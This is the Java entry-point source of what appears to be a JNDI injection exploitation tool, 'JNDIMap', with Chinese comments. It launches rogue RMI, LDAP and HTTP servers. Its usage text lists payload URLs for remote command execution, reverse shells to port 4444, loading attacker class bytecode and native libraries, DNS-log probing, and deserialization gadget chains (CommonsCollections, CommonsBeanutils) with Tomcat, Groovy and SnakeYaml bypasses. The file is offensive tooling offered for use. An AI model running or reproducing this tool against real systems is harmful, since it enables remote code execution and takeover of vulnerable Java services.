package com.example.exploit;

import com.example.exploit.server.RMIServer;
import com.example.exploit.server.WebServer;
import com.example.exploit.server.LDAPServer;

public class Main {
    public static void usage() {
        String usage = "# DnsLog\n" +
                "ldap://127.0.0.1:1389/Basic/DnsLog/xxx.dnslog.cn\n" +
                "\n" +
                "# 命令执行\n" +
                "ldap://127.0.0.1:1389/Basic/Command/open -a Calculator\n" +
                "ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==\n" +
                "\n" +
                "# 从字符串/服务器上的某个路径加载自定义的 Class 字节码\n" +
                "ldap://127.0.0.1:1389/Basic/FromCode/<base64-java-bytecode>\n" +
                "ldap://127.0.0.1:1389/Basic/FromPath/<base64-path-to-evil-class-file>\n" +
                "\n" +
                "# 反弹 Shell (支持 Windows)\n" +
                "ldap://127.0.0.1:1389/Basic/ReverseShell/127.0.0.1/4444\n" +
                "\n" +
                "# 以下 Bypass 方式支持 Basic 所有功能\n" +
                "\n" +
                "# Tomcat Bypass\n" +
                "ldap://127.0.0.1:1389/TomcatBypass/Command/open -a Calculator\n" +
                "\n" +
                "# Groovy Bypass\n" +
                "ldap://127.0.0.1:1389/GroovyClassLoader/Command/open -a Calculator\n" +
                "ldap://127.0.0.1:1389/GroovyShell/Command/open -a Calculator\n" +
                "\n" +
                "# SnakeYaml Bypass\n" +
                "ldap://127.0.0.1:1389/SnakeYaml/Command/open -a Calculator\n" +
                "\n" +
                "# MLet 探测可用 Gadget\n" +
                "# 如果 com.example.TestClass 这个类存在, 则 HTTP 服务器会接收到一个 /com/example/TestClass_exists.class 请求\n" +
                "ldap://127.0.0.1:1389/MLet/com.example.TestClass\n" +
                "\n" +
                "# NativeLibLoader 加载动态链接库\n" +
                "# 需要通过其它方式在目标机器上写入一个 dll/so/dylib, 然后通过 NativeLibLoader 加载\n" +
                "# 注意传入的 path 为绝对路径, 且不能包含后缀名\n" +
                "# 例如: 服务器上存在 /tmp/evil.so, 则 path 为 /tmp/evil\n" +
                "ldap://127.0.0.1:1389/NativeLibLoader/<base64-path-to-native-library>\n" +
                "\n" +
                "# 自定义数据 反序列化\n" +
                "ldap://127.0.0.1:1389/Deserialize/<base64-serialize-data>\n" +
                "\n" +
                "# CommonsCollectionsK1 反序列化 (3.1 + TemplatesImpl), 支持命令执行和反弹 Shell\n" +
                "ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/Command/open -a Calculator\n" +
                "ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==\n" +
                "ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/ReverseShell/127.0.0.1/4444\n" +
                "\n" +
                "# CommonsCollectionsK2 反序列化 (4.0 + TemplatesImpl), 功能同上\n" +
                "ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK2/Command/open -a Calculator\n" +
                "\n" +
                "# CommonsCollectionsK3 反序列化 (3.1 + Runtime.exec), 仅支持命令执行\n" +
                "ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK3/Command/open -a Calculator\n" +
                "ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK3/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==\n" +
                "\n" +
                "# CommonsCollectionsK4 反序列化 (4.0 + Runtime.exec), 功能同上\n" +
                "ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK4/Command/open -a Calculator\n" +
                "\n" +
                "# CommonsBeanutils1NoCC 反序列化 (1.9.4, 无需 commons-collections 依赖), 使用 TemplatesImpl, 支持命令和反弹 Shell\n" +
                "ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils1NoCC/Command/open -a Calculator\n" +
                "ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils1NoCC/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==\n" +
                "ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils1NoCC/ReverseShell/127.0.0.1/4444";
        System.out.println(usage);
    }

    public static void main(String[] args) {

        int rmiPort = 1099;
        int ldapPort = 1389;
        int httpPort = 3456;

        for (int i = 0; i < args.length; i ++ ) {
            switch (args[i]) {
                case "-h":
                    System.out.println("Usage: java -jar JNDIMap.jar [-r <rmiPort>] [-l <ldapPort>] [-p <httpPort>] [-u] [-h]");
                    return;
                case "-u":
                    usage();
                    return;
                case "-r":
                    rmiPort = Integer.parseInt(args[i + 1]);
                    break;
                case "-l":
                    ldapPort = Integer.parseInt(args[i + 1]);
                    break;
                case "-p":
                    httpPort = Integer.parseInt(args[i + 1]);
                    break;
            }
        }

        RMIServer rmiServer = new RMIServer(rmiPort, httpPort);
        LDAPServer ldapServer = new LDAPServer(ldapPort, httpPort);
        WebServer webServer = new WebServer(httpPort);

        Thread rmiThread = new Thread(rmiServer);
        Thread ldapThread = new Thread(ldapServer);
        Thread webThread = new Thread(webServer);

        rmiThread.start();
        ldapThread.start();
        webThread.start();
    }
}
